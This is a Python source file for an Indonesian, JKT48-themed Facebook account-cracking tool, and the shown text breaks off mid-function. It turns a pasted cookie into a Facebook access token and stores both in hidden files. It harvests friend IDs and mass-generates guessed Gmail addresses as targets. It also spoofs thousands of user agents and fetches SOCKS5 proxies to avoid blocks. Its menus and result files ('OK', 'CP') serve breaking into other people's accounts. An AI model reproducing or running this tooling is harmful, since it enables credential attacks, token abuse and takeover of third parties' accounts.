### ----- [ Oshi JKT48 ] ----- ###
""" Freyaa | Gadis Koleris Yang Suka Berimajinasi Terangi Harimu Dengan Senyum Karamel Ku
	Adel     | Bagai Kucing Yang Kalem Tapi Akan Selalu Memikat Hati Kamu 
	Crysti   | 
	Gita      |
	Ci Shani
	Gracia
	Lyn
	Lulu
	Zee
	Trisha
	Alin"""
### ----- [ Import Module JKT48 ] ----- ###
import requests,json,os,sys,bs4,random,datetime,time,re,zlib,subprocess,base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
from bs4 import BeautifulSoup as sop
from rich import pretty
pretty.install()
CON=sol()
crot = Console()
ses=requests.Session()
rr, rc = random.randint, random.choice
### ----- [ Data Server JKT48 ] ----- ###
id,id2 = [],[]
freya,adelia = [],[]
crysti,zee = [],[]
alin,trisha = [],[]
ok,cp,loop = 0,0,0
uadel,uaadel = [],[]
ugen,ugen2 = [],[]
id1,id2,id3 = [],[],[]
pwadel,pwalin = [],[]
wa = Console()
### ----- [ User Agent 1 ] ----- ###
for adeljkt in range(10000):
  rr = random.randint
  rc = random.choice
  AdelVer = rc([f"{str(rr(0,9))}.0",f"{str(rr(0,9))}.1.1",f"{str(rr(5,9))}.5.5",f"{str(rr(4,9))}.0.0",f"{str(rr(3,14))}"])
  IpAdel = rc([f"{str(rr(0,20))}_{str(rr(0,20))}",f"{str(rr(0,20))}_{str(rr(0,20))}_{str(rr(0,20))}",f"{str(rr(4,9))}_{str(rr(2,12))}"])
  VerCh = rc([f"{str(rr(50,210))}.0.{str(rr(1000,6400))}.{str(rr(70,300))}",f"{str(rr(100,120))}.0.0.0"])
  U1 = f"Mozilla/5.0 (Linux; Android {AdelVer}; FinePower D1 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36"
  U2 = f"Mozilla/5.0 (Linux; Android {AdelVer}); G510) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/{VerCh} Mobile Safari/537.36"
  U3 = f"Mozilla/5.0 (Linux; Android {AdelVer}; NX666J) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/{VerCh} Mobile Safari/537.36"
  U4 = f"Mozilla/5.0 (Linux; Android {AdelVer}; SAMSUNG SM-E426S) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/{VerCh} Mobile Safari/537.36"
  U5 = f"Mozilla/5.0 (Linux; Android {AdelVer}; Doro Tablet) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/{VerCh} Safari/537.36"
  U6 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {IpAdel} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21D61 AliApp(DingTalk/7.5.5) com.laiwang.DingTalk/34999137 Channel/201200 language/en-CN UT4Aplus/0.0.6 WK"
  U7 = f"Mozilla/5.0 (iPad; CPU iPad OS {IpAdel} like Mac OS X) AppleWebKit/533.2 (KHTML, like Gecko) CriOS/25.0.801.0 Mobile/47R084 Safari/533.2"
  U8 = f"Mozilla/5.0 (Linux; Android {AdelVer}; CPH1979 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36"
  U9 = f"Mozilla/5.0 (Linux; Android {AdelVer}; CPH2385 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36"
  U10 = f"Mozilla/5.0 (Linux; U; Android {AdelVer}; en-us; PHM110 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36 HeyTapBrowser/40.8.26.1"
  U11 = f"Mozilla/5.0 (Linux; Android {AdelVer}; PHM110 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]"
  U12 = f"Mozilla/5.0 (Linux; Android {AdelVer}; CPH2583 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]"
  U13 = f"Mozilla/5.0 (Linux; Android {AdelVer}; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VerCh} Mobile Safari/537.36"
  U14 = f"Mozilla/5.0 (Linux; Android {AdelVer}; M2010J19CG Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36"
  U15 = f"Mozilla/5.0 (Linux; Android {AdelVer}; 23049PCD8G Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]"
  U16 = f"Mozilla/5.0 (Linux; Android {AdelVer}; 23049PCD8G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VerCh} Mobile Safari/537.36 OPR/79.1.4195.76422"
  U17 = f"Mozilla/5.0 (Linux; Android {AdelVer}; 23076PC4BI Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/452.0.0.45.110;]"
  U18 = f"Mozilla/5.0 (Linux; arm; Android {AdelVer}; 21091116AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VerCh} YaBrowser/22.3.3.91.00 SA/3 Mobile Safari/537.36"
  U19 = f"Mozilla/5.0 (Linux; Android {AdelVer}; 21091116AG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]"
  U20 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VerCh} Mobile Safari/537.36"
  U21 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VerCh} Mobile Safari/537.36"
  JikoAdel = rc([U1,U2,U3,U4,U5,U6,U7,U8,U9,U10,U11,U12,U13,U14,U15,U16,U17,U18,U19,U20])
  ugen.append(JikoAdel)
### ----- [ User Agent 1 ] ----- ###
for adeljkt in range(10000):
  rr = random.randint
  rc = random.choice
  AdelVer = rc([f"{str(rr(0,9))}.0",f"{str(rr(0,9))}.1.1",f"{str(rr(5,9))}.5.5",f"{str(rr(4,9))}.0.0",f"{str(rr(3,14))}"])
  IpAdel = rc([f"{str(rr(0,20))}_{str(rr(0,20))}",f"{str(rr(0,20))}_{str(rr(0,20))}_{str(rr(0,20))}",f"{str(rr(4,9))}_{str(rr(2,12))}"])
  VerCh = rc([f"{str(rr(50,210))}.0.{str(rr(1000,6400))}.{str(rr(70,300))}",f"{str(rr(100,120))}.0.0.0"])
  U1 = f"Mozilla/5.0 (Linux; Android {AdelVer}; FinePower D1 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36"
  U2 = f"Mozilla/5.0 (Linux; Android {AdelVer}); G510) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/{VerCh} Mobile Safari/537.36"
  U3 = f"Mozilla/5.0 (Linux; Android {AdelVer}; NX666J) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/{VerCh} Mobile Safari/537.36"
  U4 = f"Mozilla/5.0 (Linux; Android {AdelVer}; SAMSUNG SM-E426S) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/{VerCh} Mobile Safari/537.36"
  U5 = f"Mozilla/5.0 (Linux; Android {AdelVer}; Doro Tablet) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/{VerCh} Safari/537.36"
  U6 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {IpAdel} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21D61 AliApp(DingTalk/7.5.5) com.laiwang.DingTalk/34999137 Channel/201200 language/en-CN UT4Aplus/0.0.6 WK"
  U7 = f"Mozilla/5.0 (iPad; CPU iPad OS {IpAdel} like Mac OS X) AppleWebKit/533.2 (KHTML, like Gecko) CriOS/25.0.801.0 Mobile/47R084 Safari/533.2"
  U8 = f"Mozilla/5.0 (Linux; Android {AdelVer}; CPH1979 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36"
  U9 = f"Mozilla/5.0 (Linux; Android {AdelVer}; CPH2385 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36"
  U10 = f"Mozilla/5.0 (Linux; U; Android {AdelVer}; en-us; PHM110 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36 HeyTapBrowser/40.8.26.1"
  U11 = f"Mozilla/5.0 (Linux; Android {AdelVer}; PHM110 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]"
  U12 = f"Mozilla/5.0 (Linux; Android {AdelVer}; CPH2583 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]"
  U13 = f"Mozilla/5.0 (Linux; Android {AdelVer}; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VerCh} Mobile Safari/537.36"
  U14 = f"Mozilla/5.0 (Linux; Android {AdelVer}; M2010J19CG Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36"
  U15 = f"Mozilla/5.0 (Linux; Android {AdelVer}; 23049PCD8G Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]"
  U16 = f"Mozilla/5.0 (Linux; Android {AdelVer}; 23049PCD8G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VerCh} Mobile Safari/537.36 OPR/79.1.4195.76422"
  U17 = f"Mozilla/5.0 (Linux; Android {AdelVer}; 23076PC4BI Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/452.0.0.45.110;]"
  U18 = f"Mozilla/5.0 (Linux; arm; Android {AdelVer}; 21091116AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VerCh} YaBrowser/22.3.3.91.00 SA/3 Mobile Safari/537.36"
  U19 = f"Mozilla/5.0 (Linux; Android {AdelVer}; 21091116AG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{VerCh} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]"
  U20 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VerCh} Mobile Safari/537.36"
  U21 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VerCh} Mobile Safari/537.36"
  JikoAdel = rc([U1,U2,U3,U4,U5,U6,U7,U8,U9,U10,U11,U12,U13,U14,U15,U16,U17,U18,U19,U20])
  ugen2.append(JikoAdel)
### ----- [ User Agent Redmi ] ----- ###
for xxxx in range(10000):
	rr = random.randint; rc = random.choice
	chrome_versi = f'{str(rr(40,200))}.0.{str(rr(3000,5999))}.{str(rr(10,299))}'   
	build = random.choice(['NGI77B','LRX22C','LRX22G','IML74K','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD','OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','QKQ1','LMY48I','KTU84P','MRA58K','FRF91','MMB29M','NRD90M'])
	gatau = f"Mozilla/5.0 (Linux; Android {str(rr(4,15))}; Redmi Note {str(rr(4,15))} Pro Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_versi} Mobile Safari/537.36"
	gatau1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,15))}.{str(rr(1,15))}.{str(rr(1,15))}; Redmi Note {str(rr(4,15))} Pro Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_versi} Mobile Safari/537.36"
	gatau2 = f"Mozilla/5.0 (Linux; Android {str(rr(1,15))}.{str(rr(1,15))}.{str(rr(1,15))}; Redmi Note {str(rr(4,15))} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_versi} Mobile Safari/537.36"
	gatau3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,15))}; Redmi Note {str(rr(4,15))} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_versi} Mobile Safari/537.36"
	asik = random.choice([gatau,gatau1,gatau2,gatau3])
	ugen.append(asik)
### ----- [ User Agent 2No ] ----- ###
for xxxx in range(10000):
	rr = random.randint; rc = random.choice
	chrome_versi = f'{str(rr(40,200))}.0.{str(rr(3000,5999))}.{str(rr(10,299))}'   
	build = random.choice(['NGI77B','LRX22C','LRX22G','IML74K','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD','OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','QKQ1','LMY48I','KTU84P','MRA58K','FRF91','MMB29M','NRD90M'])
	gatau = f"Mozilla/5.0 (Linux; Android {str(rr(4,15))}; Redmi Note {str(rr(4,15))} Pro Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_versi} Mobile Safari/537.36"
	gatau1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,15))}.{str(rr(1,15))}.{str(rr(1,15))}; Redmi Note {str(rr(4,15))} Pro Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_versi} Mobile Safari/537.36"
	gatau2 = f"Mozilla/5.0 (Linux; Android {str(rr(1,15))}.{str(rr(1,15))}.{str(rr(1,15))}; Redmi Note {str(rr(4,15))} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_versi} Mobile Safari/537.36"
	gatau3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,15))}; Redmi Note {str(rr(4,15))} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_versi} Mobile Safari/537.36"
	asik = random.choice([gatau,gatau1,gatau2,gatau3])
	ugen2.append(asik)
### ----- [ Kembali Hapus ] ----- ###
def back():
		loginadel()
def crystihapus():
	os.system('clear')
### ----- [ Lokasi IP ] ----- ###
CrystiIP = requests.get("https://api.ipify.org").text
lokasitrisha = requests.get("http://ip-api.com/json/").json()["region"]
### ----- [ Server Proxy JKT48 ] ----- ###
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(f'{P}[{K}+{P}] {M}Tidak Ada Koneksi.....{P}')
### ----- [ Warna Cinta JKT48 ] ----- ###
P = '\x1b[1;97m'      # --- [ PUTIH ] --- #
M = '\x1b[1;91m'     # --- [ MERAH ] --- #
H = '\x1b[1;92m'     # --- [ HIJAU ] --- #
K = '\x1b[1;93m'     # --- [ KUNING ] --- #
B = '\x1b[1;94m'     # --- [ BIRU + ] --- #
U = '\x1b[1;95m'     # --- [ UNGU ] --- #
O = '\x1b[1;96m'     # --- [ BIRU - ] --- #
N = '\33[m'             # --- [ DEFAULT ] --- #
### ----- [ Warna Kode Unik Rich ] ----- ###
P2 = "[bold white]"
H2 = "[bold green]"
M2 = "[bold red]"
U2 = "[bold purple]"
K2 = "[bold yellow]"
A2 = "[#555555]"
C2 = "[bold cyan]"
jkt_48 = rc(["bold red","bold cyan","bold purple","bold blue"])
x = datetime.datetime.now()
jamjkt = x.strftime("%H:%M:%S %P")
### ----- [ Tanggal Bulan Tahun ] ----- ###
ddefreya = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dedeadel = datetime.datetime.now().day
dedezee = ddefreya[(str(datetime.datetime.now().month))]
dedecrysti = datetime.datetime.now().year
ddetrisha = 'OK-'+str(dedeadel)+'-'+str(dedezee)+'-'+str(dedecrysti)+'.txt'
ddealin = 'CP-'+str(dedeadel)+'-'+str(dedezee)+'-'+str(dedecrysti)+'.txt'
### ----- [ Logo JKT48 ] ----- ###
def logoJKT48():
	cetak(panel(f"""
                     {M2}      _ _  _________ 
                          | | |/ /__   __|
                          | | ' /   | |   
                      {P2}_   | |  <    | |   
                     | |__| | . \   | |   
                      \____/|_|\_\  |_|   
      {M2}     | || | / _ \         {M2}N{P2}
          {M2} | || || (_) |        {M2}E{P2}
          {P2} |__   _> _ <         {M2}W{P2}
              | || (_) |        {A2}E{P2}
              |_| \___/         {A2}R{P2}
                                {A2}A{P2}
                     """,width=70,style=f"{jkt_48}",title=f"{H2}{jamjkt}",subtitle=f"{M2}JKT48 {A2}NEW ERA"))
### ----- [ Nama Account Facebook ] ----- ###
def loginadel():
	try:
		os.popen('play-audio login.mp3')
		token = open('.FreyaTok.txt','r').read()
		cok = open('.AdelCok.txt','r').read()
		trisha.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+trisha[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menutrisha(sy2,sy3)
		except KeyError:
			loginzee()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		loginzee()
### ----- [ Menu Nologin Crack ] ----- ###
def WithCiShani():
	cetak(panel(f"{M2}[{P2}01{M2}] {A2}Crack Dump\n{M2}[{P2}02{M2}] {A2}Crack Email\n{M2}[{P2}03{M2}]{A2} Crack Nama",width=70,style=f"{jkt_48}"))
	CiKalemAdel = input(f"{P}[{H}?{P}] Input : ")
	if CiKalemAdel in ['01','1']:
		DumpCrysti()
	elif CiKalemAdel in ['02','2']:
		DumpZee()
	elif CiKalemAdel in ['03','3']:
		Cari_Nama().apa_nama()
	else:
		cetak(panel(f"{P2}Input Tidak Di Ketahui",width=50,style=f"{jkt_48}"))
### ----- [ Menu Login Cookies ] ----- ###
def loginzee():
    crystihapus()
    logoJKT48()
    cetak(panel(f"{P2}[{H2}!{P2}] Masukan Cookies Facebook Anda Gunakan Exstesion {H2}CookieDough\n{P2}[{H2}!{P2}] Ketik Nologin Untuk Krek NoLogin",width=70,style=f"{jkt_48}",title=f"{M2}JKT48{A2} NEW ERA"))
    cookie = input(f'{P}[{H}!{P}] Cookie : {H}')
    if cookie in ['nologin','Nologin','NOLOGIN']:WithCiShani()
    token_eaab = generate_token_eaab(cookie)
    cetak(panel(f"{C2}{token_eaab}",width=70,style=f"{jkt_48}",title=f"{P2}Freya Token"))
    tokenw = open(".FreyaTok.txt", "w").write(token_eaab)
    cokiew = open(".AdelCok.txt", "w").write(cookie)
    cetak(panel(f"{P2}Login Ke Dalam Teather JKT48 Berhasil...!!!! Silahkan Jalankan Ulang Perintah",width=70,style=f"{jkt_48}",title=f" {M2}JKT48{A2} NEW ERA"))
def generate_token_eaab(cok):
    r = requests.Session()
    req1 = r.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies={'cookie':cok},allow_redirects=True).text
    nek1 = re.search('window\.location\.replace\("(.*?)"\)',str(req1)).group(1).replace('\\','')
    req2 = r.get(nek1,cookies={'cookie':cok},allow_redirects=True).text
    tok  = re.search('accessToken="(.*?)"',str(req2)).group(1)
    return(tok)
### ----- [ Menu JKT48 ] ----- ###
def menutrisha(nameadel,idfreya):
	try:
		token = open('.FreyaTok.txt','r').read()
		cok = open('.AdelCok.txt','r').read()
	except IOError:
		cetak(panel(f"{P2}Waduh Sayang Sekali Cookies Teather JKT48 Anda Sudah Habis",width=70,style=f"{jkt_48}",title=f"{P2}Cookies Kadaluarsa"))
		time.sleep(3)
		loginzee()
	crystihapus()
	logoJKT48()
	#os.popen('play-audio login.mp3')
	zee.append(panel(f"{P2}Name Anda   : {H2}{nameadel}\n{P2}ID Anda     : {H2}{idfreya}\n{P2}IP Anda     : {H2}{CrystiIP}\n{P2}Lokasi Anda : {H2}{lokasitrisha}\n{P2}Date        : {H2}{dedeadel}-{dedezee}-{dedecrysti}",width=38,style=f"{jkt_48}",title=f"{P2}Informasi Pribadi"))
	zee.append(panel(f"{P2}Name Author : {H2}FiiXc4You\n{P2}Github      : {H2}FiiXc4You\n{P2}Exspired    : {M2}05-Maret-2024\n{P2}Status      : {H2}Pribadi\n{P2}Versi       : {M2}JKT48 {A2}NEW ERA",width=38,style=f"{jkt_48}",title=f"{P2}Informasi Author"))
	wa.print(Columns(zee))
	cetak(panel(f"{M2}[{P2}01{M2}] {A2}Dump With Friend\n{M2}[{P2}02{M2}] {A2}Dump With Email\n{M2}[{P2}03{M2}] {A2}Cek Hasil Result\n{M2}[{P2}04{M2}] {A2}Crack File\n{M2}[{P2}05{M2}]{A2} Dump Id\n{M2}[{P2}06{M2}]{A2} Crack Nama\n{M2}[{P2}00{M2}] {A2}Logout Scrip JKT48",style=f"{jkt_48}",width=70,title=f"{M2}JKT48 {A2}NEW ERA",subtitle=f"{P2}Menu Crack"))
	FreyaAdel = input(f'{P}[{H}?{P}] Input : ')
	if FreyaAdel in ['01','1']:
		DumpAdel()
	elif FreyaAdel in ['02','2']:
		DumpZee()
	elif FreyaAdel in ['03','3']:
		CekTrisha()
	elif FreyaAdel in ['04','4']:
		DumpCrysti()
	elif FreyaAdel in ['05','5']:
		DumpAlin()
	elif FreyaAdel in ['06','6']:
		Cari_Nama().apa_nama()
	elif FreyaAdel in ['00','0']:
		cetak(panel(f"{P2}Anda Yakin Ingin Meninggalkan Teather {M2}JKT48{A2} NEW ERA ??",width=70,style=f"{jkt_48}"))
		Dedel = input(f"{P}[{H}!{P}] Hapus Cookies JKT48 Y/T : ")
		if Dedel in ['y','Y']:
			os.system('rm -rf .FreyaTok.txt')
			os.system('rm -rf .AdelCok.txt')
			cetak(panel(f"{P2}Sukses Meninggalkan Teather {M2}JKT48{A2} NEW ERA",width=70,style=f"{jkt_48}"))
			time.sleep(3)
			loginzee()
		elif Dedel in ['t','T']:
			loginadel()
		else:
			cetak(panel(f"{P2}Unknown option, please try again",width=50,style=f"{jkt_48}"))
	else:
		cetak(panel(f"{P2}Unknown option, please try again",width=50,style=f"{jkt_48}"))
### ----- [ DumpWithAdel ] ----- ###
def DumpAdel():
    uid = []
    tok = open('.FreyaTok.txt','r').read()
    cok = open('.AdelCok.txt','r').read()
    cetak(panel(f"{P2}[{H2}!{P2}] Jika Ingin Krek Massal Gunakan ',' Pastikan Target Publik",width=70,style=f"{jkt_48}"))
    lid = input('Masukan Id : ').split(',')
    for usrr in lid:
        try:
            r = requests.Session()
            url = f'https://graph.facebook.com/v12.0/{usrr}/friends'
            LoopDump(r, cok, tok, url, id, None)
        except KeyboardInterrupt: pass
        except Exception as e: pass
        print(f"\r")
    settingWithAdel()
def LoopDump(r, cok, tok, url, id, after):
    try:
        dta = {'access_token':tok,'after':after,'pretty':'1'}
        req = r.get(url,params=dta,cookies={'cookies':cok}).json()
        if 'temporarily blocked' in str(req):
            print('Oops, Sepertinya Akunmu Spam!')
            exit('')
        for d in req['data']:
            try:
                woy = (d['id']+'|'+d['name'])
                if woy in id:pass
                else:id.append(woy)
                print(f'\rSedang Dump {H}%s {P}ID'%(str(len(id))),end=''); sys.stdout.flush()
            except Exception as e: continue
        after = req['paging']['cursors']['after']
        LoopDump(r,cok,tok,url,id,after)
    except KeyboardInterrupt: pass
    except Exception as e: pass
### ----- [ DumpWithZee ] ----- ###
def DumpZee():
	bas = ['nazri','nizar','reni','aidil','yusup','yusep','sidik','encas','erika','ika','agil','lang','ling','lung','ani','keyla','septi','cepi','galuh','rona','ronaldo','ado','deon','ratu','ara','nia','nina','panji','heru','gaga','ega','agnes','ilma','puji','pujia','uji','hesti','reksa','bulan','alip','alif','sahri','raisa','mela','mella','cucu','ria','sarah','bunga','vina','cia','tiya','candra','bilal','fatimah','arya','kevin','bima','nurul','suparhan','ahmad','mahmud','asep','ramdan','saputra','kurnia','ramdani','hilda','mita','miya','ayu','gopur','tia','bono','mutiara','arin','wiwin','winda','penita','iyus','herlan','dinda','nda','naya','niya','aca','bandros','refan','wapda','rahman','maman','mimin','fitrah','adit','adat','fiki','aulia','tata','enung','esih','jajang','febi','ismi','wida','sanji','regi','rega','ferdi','firman','jimi','mawar','ratna','dimas','sasa','tia','tini','medusa','dewi','winda','setia','putri','danil','galang','gilang','denis','deni','sela','nabil','sinta','amel','melia','putra','telor','sabun','nia','kira','mela','mila','lisa','lida','lidi','ali','jaya','kiki','pian','pita','juwita','junita','nita','anisa','nisa','sani','sari','uje','uji','olip','oli','fikar','nur','siti','aji','oji','rada','imas','mia','tuti','tia','ima','sendi','febian','rima','raka','rati','jiman','dodi','reza','yani','galih','hia','siva','opik','kamal','jamal','linda','lida','ida','adi','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['boy','mabok','eam','aulia','kasih','cantik','kasep','ganteng','tzy','1','2','3','4','5','6','7','8','9','99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	cetak(panel(f"{P2}[{H2}!{P2}] Masukan Nama Yang Ingin Kalian Crack Cukup 1 Saja",width=70,style=f"{jkt_48}"))
	nama = input(f"{P}[{H}?{P}] Masukan Nama : ")
	if ',' in str(nama):
		cetak(panel(f"{P2}[{H2}!{P2}] Masukan Satu Nama Saja.....!!!!!",width=70,style=f"{jkt_48}"))
	doma = '@gmail.com'
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f'[+] masukan domain yang benar')
	jumlah = input(f'{P}[{H}?{P}] Masukan Jumlah : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,90))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,30))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(id)==1010101010101010101:settingWithAdel()
		#print('\r[+] Total \033[32m%s \033[0mID'%(len(id)),end='')
		#sys.stdout.flush()
	settingWithAdel()
### ----- [ CekWithTrisha ] ----- ###
def CekTrisha():
	cetak(panel(f"{M2}[{P2}01{M2}] {A2}Cek Hasil [b green]OK\n[b red][[b white]02[b red]] {A2}Cek Hasil [b yellow]CP",width=70,style=f"{jkt_48}"))
	kz = input(f'{P}[{H}?{P}] Input : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			cetak(panel(f"[b white]File Tidak DiTemukan",width=50,style=f"{jkt_48}"))
			time.sleep(3)
			back()
		if len(vin)==0:
			cetak(panel(f"[b white]Anda Tidak Memiliki Hasil [b ywllow]CP",width=50,style=f"{jkt_48}"))
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					cetak(panel(f"[b red][[b white]{nom}[b red]] {A2}{isi} {str(len(hem))} Account",width=50,style=f"{jkt_48}"))
					#print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]')
				else:
					lol.update({str(cih):str(isi)})
					cetak(panel(f"[b red][[b white]{str(cih)}[b red]] {A2}{isi} {str(len(hek))} Account",width=50,style=f"{jkt_48}"))
				#	print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'{P}[{H}?{P}] Input : ')
			try:geh = lol[geeh]
			except KeyError:
				cetak(panel(f"[b white]Yang Bener Kak 1/2",width=50,style=f"{jkt_48}"))
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				cetak(panel(f"[b white]File Tidak DiTemukan",width=50,style=f"{jkt_48}"))
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				tree = Tree(" ")
